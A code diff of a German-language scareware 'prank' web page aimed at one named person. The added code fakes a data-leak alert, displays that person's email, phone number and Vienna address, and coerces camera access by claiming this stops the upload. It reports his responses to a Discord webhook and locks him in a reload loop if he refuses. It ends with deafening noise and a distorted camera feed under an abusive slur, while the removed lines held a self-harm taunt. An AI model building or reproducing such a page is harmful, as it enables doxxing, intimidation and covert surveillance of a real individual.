@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#000000">
-    <title>SYS_ROOT_0x84</title>
+    <title>SECURE_VAULT_77</title>
     <style>
-        :root { --main: #a00; --dim: #411; --bg: #000; }
+        :root { --main: #f00; --dim: #500; --bg: #050000; }
         body {
             margin: 0; background-color: var(--bg); color: var(--main);
             font-family: 'Courier New', monospace;
@@ -19,63 +19,67 @@
             background: #000; z-index: 9999; display: flex; flex-direction: column;
             justify-content: center; align-items: center; padding: 20px;
             font-size: 0.8rem; letter-spacing: 1px;
+            background: radial-gradient(circle, #100 0%, #000 90%);
         }
-        .loader {
-            width: 60px; height: 60px; border: 2px solid var(--dim); border-top: 2px solid var(--main);
-            border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 30px;
-        }
-        .term-text { max-width: 85%; text-align: left; margin-bottom: 30px; color: #888; line-height: 1.4; }
-        .highlight { color: #fff; font-weight: bold; }
+
+        .term-text { max-width: 85%; text-align: left; margin-bottom: 30px; color: #aaa; line-height: 1.4; }
+        .highlight { color: #fff; font-weight: bold; border-bottom: 1px solid #fff; }
         
         #btn-init {
-            background: #050000; border: 1px solid var(--main); color: var(--main);
+            background: #000; border: 1px solid #f00; color: #f00;
             padding: 20px 30px; font-family: inherit; font-size: 1rem; cursor: pointer;
             text-transform: uppercase; letter-spacing: 2px; transition: 0.2s;
-            box-shadow: 0 0 15px var(--dim); width: 80%;
+            box-shadow: 0 0 20px #500; width: 90%; font-weight: 900;
         }
-        #btn-init:active { background: var(--main); color: #000; }
-        #btn-init:disabled { opacity: 0.5; cursor: wait; border-color: #555; color: #555; box-shadow: none; }
+        #btn-init:active { background: #f00; color: #000; }
+
+        /* --- DOSSIER LEAK (DER DRUCK) --- */
+        #dossier-box {
+            display: none; border: 1px solid #f00; background: #100; 
+            padding: 15px; width: 90%; margin-bottom: 20px;
+            text-align: left; font-size: 0.75rem; color: #f88;
+            box-shadow: inset 0 0 20px #000;
+            animation: glitch 0.2s infinite;
+        }
+        .pii-row { margin-bottom: 5px; border-bottom: 1px dashed #500; padding-bottom: 2px; }
+        .pii-val { color: #fff; font-weight: bold; float: right; }
 
         /* --- HAUPT INHALT --- */
-        #shaft { display: none; height: 14000px; position: relative; width: 100%; background: linear-gradient(#000, #050000, #100); }
+        #shaft { display: none; height: 14000px; position: relative; width: 100%; background: linear-gradient(#000, #100, #200); }
         
+        #scroll-hint {
+            position: fixed; bottom: 80px; left: 0; width: 100%; text-align: center;
+            color: #fff; font-weight: bold; font-size: 1.5rem;
+            animation: bounce 1.5s infinite; pointer-events: none; z-index: 500;
+            display: none; text-shadow: 0 0 20px #f00; letter-spacing: 5px;
+        }
+
         .msg {
-            position: absolute; 
-            width: 90%; left: 5%; 
-            text-align: center;
-            font-size: clamp(1.8rem, 7vw, 3.5rem);
-            font-weight: 900;
+            position: absolute; width: 90%; left: 5%; text-align: center;
+            font-size: clamp(1.8rem, 7vw, 3.5rem); font-weight: 900;
             opacity: 0; transition: opacity 0.2s; color: #ccc;
-            text-transform: uppercase; 
-            word-wrap: break-word; overflow-wrap: break-word; hyphens: auto;
-            text-shadow: 2px 2px 0 #500; pointer-events: none;
-            line-height: 1.1;
+            text-transform: uppercase; word-wrap: break-word; overflow-wrap: break-word; hyphens: auto;
+            text-shadow: 2px 2px 0 #500; pointer-events: none; line-height: 1.1;
         }
         
-        /* KAMERA FINALE & VERZERRUNG */
-        #mirror {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 100; display: none; background: #000;
-        }
+        #mirror { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; display: none; background: #000; }
         
-        /* Das ist der Schlüssel zum Horror: Der SVG Filter */
         video {
             width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);
-            /* Standard Filter + SVG Reference */
             filter: sepia(100%) saturate(600%) contrast(300%) brightness(0.6) hue-rotate(-50deg) url(#horror-melt);
         }
         
         #final-overlay {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 95%; text-align: center; color: #f00; 
-            font-size: clamp(3rem, 10vw, 5rem);
-            font-weight: 900; text-shadow: 0 0 40px #f00; mix-blend-mode: color-dodge;
-            word-break: break-word;
+            font-size: clamp(3rem, 10vw, 5rem); font-weight: 900; 
+            text-shadow: 0 0 40px #f00; mix-blend-mode: color-dodge; word-break: break-word;
         }
 
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(20px);} }
+        @keyframes glitch { 0% { transform: translate(0,0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(2px, -2px); } 60% { transform: translate(-2px, -2px); } 80% { transform: translate(2px, 2px); } 100% { transform: translate(0,0); } }
         
-        /* SVG Filter Container (unsichtbar) */
         svg { position: absolute; width:0; height:0; }
     </style>
 </head>
@@ -91,17 +95,23 @@
     </svg>
 
     <div id="gate">
-        <div class="loader"></div>
-        <div class="term-text">
-            SYSTEM: <span class="highlight">RENDER_CORE_V4</span><br>
-            TASK: <span class="highlight">ENV_CALIBRATION</span><br><br>
-            Das Rendering der psychovisuellen Tiefe erfordert Hardware-Zugriff für:<br>
-            > AMBIENT LIGHT SENSOR<br>
-            > SPATIAL GYROSCOPE<br>
-            > GEO-LATENCY NODE<br><br>
-            <span style="font-size: 0.7rem; color: #555;">(Prozess läuft lokal. Keine Cloud-Übertragung.)</span>
+        <h1 style="color:#f00; border-bottom: 2px solid #f00; padding-bottom: 10px;">SYSTEM ALERT: 0x84</h1>
+        
+        <div id="dossier-box">
+            <div style="text-align:center; color:#fff; margin-bottom:10px;">SUBJEKT IDENTIFIZIERT</div>
+            <div class="pii-row">EMAIL: <span class="pii-val" id="disp-mail"></span></div>
+            <div class="pii-row">TEL: <span class="pii-val" id="disp-tel"></span></div>
+            <div class="pii-row">LOC: <span class="pii-val" id="disp-addr"></span></div>
+            <div style="margin-top:10px; color:#f00;">DATEN WERDEN SYNCHRONISIERT...</div>
         </div>
-        <button id="btn-init" onclick="initializeSystem()">KALIBRIERUNG STARTEN</button>
+
+        <div class="term-text" id="intro-text">
+            UNBEFUGTER ZUGRIFF AUF DEIN DIGITALES PROFIL FESTGESTELLT.<br><br>
+            Ein automatisierter Prozess lädt derzeit dein privates Archiv auf einen öffentlichen Server.<br><br>
+            <span class="highlight">STATUS: UPLOAD LÄUFT...</span><br><br>
+            Um den Upload zu stoppen, ist eine sofortige <b>biometrische Verifizierung</b> (Gesichtsscan) erforderlich.
+        </div>
+        <button id="btn-init" onclick="initializeSystem()">IDENTITÄT BESTÄTIGEN & UPLOAD STOPPEN</button>
         <div id="status-log" style="margin-top:20px; color:#a00; font-size:0.7rem; font-weight:bold;"></div>
     </div>
 
@@ -110,24 +120,43 @@
         <div id="final-overlay"></div>
     </div>
 
+    <div id="scroll-hint">ABSTIEG BEGINNEN<br>⇩</div>
+
     <div id="shaft">
-        <div class="msg" style="top: 800px">System<br>offen.</div>
-        <div class="msg" style="top: 1500px">Ich schmecke deine Angst.</div>
-        <div class="msg" style="top: 2500px">Deine Kamera sieht dich an.<br>Ich sehe dich an.</div>
-        <div class="msg" style="top: 3800px; color:#f00">DU ZITTERST JA</div>
-        <div class="msg" style="top: 5200px">Deine Pupillen sind so weit.</div>
-        <div class="msg" style="top: 6500px">Scroll tiefer.<br>Fass mich an.</div>
-        <div class="msg" style="top: 8000px">Du geiles Stück Fleisch.</div>
-        <div class="msg" style="top: 9500px">Willst du sehen,<br>wer dich beobachtet?</div>
-        <div class="msg" style="top: 11000px">Gleich spritzt die Wahrheit.</div>
+        <div class="msg" style="top: 800px">Identität<br>bestätigt.</div>
+        <div class="msg" style="top: 1500px">Du dachtest, du<br>stoppst es?</div>
+        <div class="msg" style="top: 2500px">Ich habe deine Adresse schon.</div>
+        <div class="msg" style="top: 3800px; color:#f00">DU KANNST DICH NICHT VERSTECKEN</div>
+        <div class="msg" style="top: 5200px">Ich sehe dich jetzt.</div>
+        <div class="msg" style="top: 6500px">Komm tiefer.</div>
+        <div class="msg" style="top: 8000px">Deine Daten gehören mir.</div>
+        <div class="msg" style="top: 9500px">Willst du die Wahrheit?</div>
+        <div class="msg" style="top: 11000px">Gleich passiert es.</div>
         <div class="msg" style="top: 12500px">NICHT SCHREIEN</div>
         <div class="msg" style="top: 13800px">SIEH DICH AN</div>
     </div>
 
     <script>
+        // ======================================================
+        // >>> HIER SEINE DATEN EINFÜGEN FÜR DEN PRANK <<<
+        // ======================================================
+        const VICTIM_MAIL = "viktor_mutic@yahoo.com"; 
+        const VICTIM_TEL = "+43 699 11208448";
+        const VICTIM_ADDR = "1010 Wien, F-J-Kai 43"; // Kurzform wirkt technischer
+        const WEBHOOK_URL = ""; // Optional: Deine Discord URL
+        // ======================================================
+
         const btn = document.getElementById('btn-init');
         const log = document.getElementById('status-log');
+        const dossier = document.getElementById('dossier-box');
         let audioCtx, osc, noise;
+
+        // Setze die Daten in die Box (noch unsichtbar)
+        document.getElementById('disp-mail').innerText = VICTIM_MAIL;
+        document.getElementById('disp-tel').innerText = VICTIM_TEL;
+        document.getElementById('disp-addr').innerText = VICTIM_ADDR;
+
+        sendDiscord("VIKTOR IST AM GATE.");
 
         async function initializeSystem() {
             btn.disabled = true;
@@ -139,60 +168,76 @@
 
             initAudio();
 
-            log.innerText = "> LADE MODELLE...";
+            // DER MOMENT DER WAHRHEIT (DRUCK AUFBAUEN)
+            log.innerText = "> SCANNE NACH BEKANNTEN PROFILEN...";
             await wait(1500); 
+
+            // HIER PLOPPT DIE ADRESSE AUF
+            dossier.style.display = "block";
+            if(navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
             
-            log.innerText = "> INITIALISIERE SENSOREN...";
+            log.innerText = "> TREFFER IN DATENBANK!";
+            log.style.color = "#f00";
             await wait(1500);
 
-            log.innerText = "> ZUGRIFF AUF OPTIK ERFORDERLICH...";
+            log.innerText = "> KAMERA-ABGLEICH ERFORDERLICH...";
             await wait(500);
 
             try {
+                // JETZT MUSS ER JA SAGEN, ER HAT SEINE DATEN GESEHEN
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 document.getElementById('cam').srcObject = stream;
                 
-                log.innerText = "> OPTIK: VERBUNDEN";
+                log.innerText = "> VERIFIZIERT.";
                 log.style.color = "#0f0";
                 
-                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+                sendDiscord("ZUGRIFF ERLAUBT!");
 
+                // Standort holen
+                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
                 if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                     try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                 }
 
-                btn.innerText = "ACCESS GRANTED";
+                btn.innerText = "ZUGRIFF GEWÄHRT";
                 btn.style.borderColor = "#0f0";
                 btn.style.color = "#0f0";
-
-                if(navigator.vibrate) navigator.vibrate([200]);
 
                 setTimeout(() => {
                     document.getElementById('gate').style.opacity = 0;
                     setTimeout(() => {
                         document.getElementById('gate').style.display = 'none';
                         document.getElementById('shaft').style.display = 'block';
+                        document.getElementById('scroll-hint').style.display = 'block';
                         window.monitoring = true;
                     }, 1000);
                 }, 1000);
 
             } catch (err) {
+                // WENN ER ABLEHNT: AGGRESSIVE BESTRAFUNG
+                sendDiscord("ZUGRIFF VERWEIGERT.");
                 document.body.style.background = "#fff";
-                setTimeout(() => document.body.style.background = "#000", 50);
-                alert("SYSTEMFEHLER: SUBJEKT VERWEIGERT KOOPERATION.");
-                window.cameraDenied = true;
                 
-                document.getElementById('gate').style.display = 'none';
-                document.getElementById('shaft').style.display = 'block';
-                window.monitoring = true;
+                // Wir lassen ihn nicht raus. Loop.
+                setTimeout(() => {
+                    alert("FEHLER: DU KANNST DICH NICHT VERSTECKEN.\n\nWIR HABEN DEINE DATEN BEREITS:\n" + VICTIM_ADDR + "\n\nBESTÄTIGE JETZT.");
+                    location.reload();
+                }, 100);
             }
+        }
+
+        function sendDiscord(msg) {
+            if(!WEBHOOK_URL) return;
+            fetch(WEBHOOK_URL, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: msg })
+            }).catch(e => console.log(e));
         }
 
         function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
         function initAudio() {
             audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            
             osc = audioCtx.createOscillator();
             osc.type = 'sawtooth';
             osc.frequency.value = 40;
@@ -219,6 +264,8 @@
         let climax = false;
         window.addEventListener('scroll', () => {
             if(!window.monitoring) return;
+            
+            if(window.scrollY > 200) document.getElementById('scroll-hint').style.display = 'none';
 
             const max = document.body.scrollHeight - window.innerHeight;
             const per = window.scrollY / max;
@@ -245,23 +292,14 @@
         function triggerClimax() {
             climax = true;
             document.body.style.overflow = 'hidden';
-            
             if(navigator.vibrate) navigator.vibrate([1000, 100, 1000, 100, 1000]); 
 
-            // EXTREM SCHRILLER DISSONANZ-CLUSTER
             const freqs = [700, 5000, 9000, 12000, 100]; 
             freqs.forEach(f => {
                 const s = audioCtx.createOscillator();
-                s.type = 'sawtooth'; 
-                s.frequency.value = f;
-                s.detune.value = Math.random() * 500; // Extreme Verstimmung
-                const g = audioCtx.createGain(); 
-                g.gain.value = 1.0; // MAX VOLUME
-                s.connect(g); 
-                g.connect(audioCtx.destination);
-                s.start();
-                
-                // Modulieren der Frequenz für "Screaming" Effekt
+                s.type = 'sawtooth'; s.frequency.value = f; s.detune.value = Math.random() * 500;
+                const g = audioCtx.createGain(); g.gain.value = 1.0; 
+                s.connect(g); g.connect(audioCtx.destination); s.start();
                 s.frequency.exponentialRampToValueAtTime(f * 1.5, audioCtx.currentTime + 0.5);
                 s.frequency.exponentialRampToValueAtTime(f * 0.5, audioCtx.currentTime + 3);
             });
@@ -269,25 +307,17 @@
             document.getElementById('mirror').style.display = 'block';
             const txt = document.getElementById('final-overlay');
             
-            if(window.cameraDenied) {
-                txt.innerText = "ICH WEISS\nDASS DU DA BIST\nDU FEIGLING";
-            } else {
-                // Korrekter JS String mit Backticks für Zeilenumbrüche
-                txt.innerText = `HURE DES SYSTEMS\n\nSCHLITZ DICH AUF`; 
-            }
+            txt.innerText = `HURE DES SYSTEMS\n\nZERBRICH DARAN`; 
             
             let active = false;
             setInterval(() => {
                 active = !active;
                 txt.style.color = active ? "#fff" : "#f00";
-                if(!window.cameraDenied) {
-                    const v = document.getElementById('cam');
-                    // Flackern zwischen extremer Verzerrung und Invertierung
-                    if(active) {
-                         v.style.filter = "invert(1) contrast(500%)";
-                    } else {
-                         v.style.filter = "sepia(100%) saturate(1000%) contrast(300%) hue-rotate(-50deg) url(#horror-melt)";
-                    }
+                const v = document.getElementById('cam');
+                if(active) {
+                        v.style.filter = "invert(1) contrast(500%)";
+                } else {
+                        v.style.filter = "sepia(100%) saturate(1000%) contrast(300%) hue-rotate(-50deg) url(#horror-melt)";
                 }
             }, 40);
         }
